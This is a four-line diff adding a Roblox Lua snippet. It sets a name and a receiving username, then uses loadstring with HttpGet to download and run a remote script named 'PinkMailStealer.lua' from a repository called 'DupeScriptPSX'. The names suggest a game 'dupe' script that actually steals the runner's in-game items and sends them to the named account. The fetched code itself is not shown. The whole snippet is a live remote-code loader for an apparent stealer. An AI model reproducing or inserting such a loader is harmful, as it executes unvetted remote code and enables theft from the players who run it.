@@ -1,0 +1,4 @@
+_G.Name = "HI GUYS IM DEV"
+_G.Username = "Dev_RlCH"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
